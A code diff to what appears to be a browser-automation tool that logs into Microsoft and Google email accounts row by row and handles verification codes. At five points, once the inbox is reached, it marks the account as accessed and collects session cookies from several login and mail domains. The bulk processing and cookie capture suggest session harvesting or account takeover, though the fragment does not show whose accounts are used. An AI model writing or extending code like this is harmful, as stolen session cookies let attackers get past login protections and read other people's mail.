@@ -4904,6 +4904,9 @@ if (!foundSelector) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
                                         finalStatus = "PROCESSING_FINALIZING";
                                         codeSuccessfullyProcessed = true;
+                                        initialCheckResult.reachedInbox = true;
+                                        initialCheckResult.requiresVerification = false;
+                                        initialCheckResult.accountAccess = true;
 
                                         const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                         updateData.status = "PROCESSING_FINALIZING";
@@ -4978,6 +4981,9 @@ if (!foundSelector) {
                                             logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting PROCESSING_FINALIZING.`);
                                             finalStatus = "PROCESSING_FINALIZING";
                                             codeSuccessfullyProcessed = true;
+                                            initialCheckResult.reachedInbox = true;
+                                            initialCheckResult.requiresVerification = false;
+                                            initialCheckResult.accountAccess = true;
 
                                             const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                             updateData.status = "PROCESSING_FINALIZING";
@@ -5100,6 +5106,9 @@ if (!foundSelector) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to COMPLETED.`);
                                         finalStatus = "PROCESSING_FINALIZING";
                                         codeSuccessfullyProcessed = true;
+                                        initialCheckResult.reachedInbox = true;
+                                        initialCheckResult.requiresVerification = false;
+                                        initialCheckResult.accountAccess = true;
 
                                         const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                         updateData.status = "PROCESSING_FINALIZING";
@@ -5176,6 +5185,9 @@ if (!foundSelector) {
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to COMPLETED.`);
                                 finalStatus = "PROCESSING_FINALIZING";
                                 codeSuccessfullyProcessed = true;
+                                initialCheckResult.reachedInbox = true;
+                                initialCheckResult.requiresVerification = false;
+                                initialCheckResult.accountAccess = true;
 
                                 const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                 updateData.status = "PROCESSING_FINALIZING";
@@ -5390,6 +5402,9 @@ if (!foundSelector) {
                                     logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.`);
                                     finalStatus = "PROCESSING_FINALIZING";
                                     codeSuccessfullyProcessed = true;
+                                    initialCheckResult.reachedInbox = true;
+                                    initialCheckResult.requiresVerification = false;
+                                    initialCheckResult.accountAccess = true;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                     const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                     updateData.status = "PROCESSING_FINALIZING";
